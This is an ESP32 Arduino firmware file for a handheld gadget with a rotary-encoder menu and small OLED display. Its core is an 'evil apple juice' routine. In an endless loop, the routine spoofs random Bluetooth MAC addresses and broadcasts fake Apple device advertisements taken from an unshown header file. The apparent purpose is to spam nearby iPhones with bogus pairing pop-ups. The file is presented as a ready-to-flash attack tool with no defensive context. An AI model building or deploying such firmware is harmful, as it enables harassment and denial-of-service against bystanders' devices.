#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <REncoder.h>
#include <SSD1306Wire.h>
#include <Wire.h>

#include "devices.hpp"

#define USE_MULTCORE 1

#define Encoder_CLK 5
#define Encoder_DT 18
#define Encoder_SW 19
#define SCK 16
#define SDA 17

TaskHandle_t th_p[2];  // Task handle list

BLEAdvertising *pAdvertising;  // global variable
uint32_t delayMilliseconds = 1000;

SSD1306Wire display(0x3c, SCK, SDA, GEOMETRY_128_32);

REncoder encoder(Encoder_CLK, Encoder_DT, Encoder_SW);
int device_id = 0;
int global_flag = 0;
int juice_status[2] = {0, 0};  // Initiated, Running
// 0: Menu
// 1: eval apple juice

void evilAppleJuiceInit() {
  BLEDevice::init("StartName");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void evilAppleJuiceStart(void *startJuice) {
  while (1) {
    // First generate fake random MAC address
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
      if (i == 0) {
        dummy_addr[i] |= 0xF0;
      }
    }

    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    oAdvertisementData.addData(std::string((char *)DEVICES[device_id], 31));

    int adv_type_choice = random(3);
    if (adv_type_choice == 0) {
      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    } else if (adv_type_choice == 1) {
      pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    } else {
      pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }

    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->setAdvertisementData(oAdvertisementData);

    Serial.println("Sending packets ...");
    pAdvertising->start();
    delay(delayMilliseconds);
    pAdvertising->stop();
    delay(1);
  }
}

void encoderHandler(REncoderWithoutSwitch::Event encoderEvent,
                    RENCODER_ROTATION_VALUE_TYPE encPos) {
  if (global_flag == 0) {
    switch (encoderEvent) {
      case REncoder::Event::REncoder_Event_Rotate_CW:
        device_id++;
        if (device_id > 16) {
          device_id = 16;
        }
        break;
      case REncoder::Event::REncoder_Event_Rotate_CCW:
        device_id--;
        if (device_id < 0) {
          device_id = 0;
        }
        break;
    }
  }
}

void switchHandler() {
  switch (global_flag) {
    case 0:
      global_flag = 1;
      break;

    case 1:
      global_flag = 0;
      if(juice_status[1]==1){
        vTaskDelete(th_p[0]);
        pAdvertising->stop();
        juice_status[1] = 0;
      }
      break;
  }

  Serial.println("IRQ -> Switch pushed.");
}

void setup() {
  display.init();

  display.setTextAlignment(TEXT_ALIGN_CENTER_BOTH);

  encoder.setMinEncoderPosition(-1);
  encoder.setMaxEncoderPosition(1);
  encoder.attachSwitchHandler(switchHandler);

  encoder.attachEncoderHandler(encoderHandler);
  Serial.begin(115200);
}

uint8_t cir_rs[4] = {2, 4, 6, 8};
uint8_t ani_stage = 0;
void loop() {
  display.clear();
  switch (global_flag) {
    case 0:
      display.drawString(64, 16, DEVICE_NAME[device_id]);
      break;

    case 1:
      if (ani_stage == 4) ani_stage = 0;
      display.drawCircle(64, 16, cir_rs[ani_stage]);
      ani_stage++;
      if (juice_status[0] == 0) {
        evilAppleJuiceInit();
        juice_status[0] = 1;
      }
      if (juice_status[1] == 0) {
        xTaskCreatePinnedToCore(evilAppleJuiceStart, "JuiceRun", 4096, NULL, 1,
                                &th_p[0], 0);
        juice_status[1] = 1;
      }
  }

  display.display();
  delay(200);
}
